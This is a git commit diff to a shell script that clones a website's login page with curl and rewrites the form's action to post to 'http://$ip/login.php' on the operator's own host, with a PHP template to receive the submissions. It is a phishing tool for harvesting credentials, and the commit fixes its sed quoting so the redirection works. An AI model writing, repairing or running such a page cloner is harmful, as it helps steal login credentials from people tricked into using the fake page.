9ff67f90bc5e0d05cd0a8edb5d91c32ea31977c6
Ofek Vardi <ofekvar1@gmail.com>
2022-05-14 19:53:37 +0300

    Fix sed command syntax to expand variables correctly

--- create-page.sh
+++ create-page.sh
@@ -9,9 +9,9 @@ read page
 # Fetch login page source code
 curl -sL $page > login.html
 # Replace the 'action' and 'method' form attributes
-sed -i 's/action="[^"]*/action="http://$ip/login.php' login.html
+sed -i 's,action="[^"]*,action="http://'"$ip"'/login.php,' login.html
 sed -i 's/method="[^"]*/method="get/' login.html
 
-# Create php script from php template
-cp template.php login.php
-sed -i 's/PAGELINK/$page' login.php
+## Create php script from php template
+sed 's,PAGELINK,'"$page"',' template.php > login.php
+
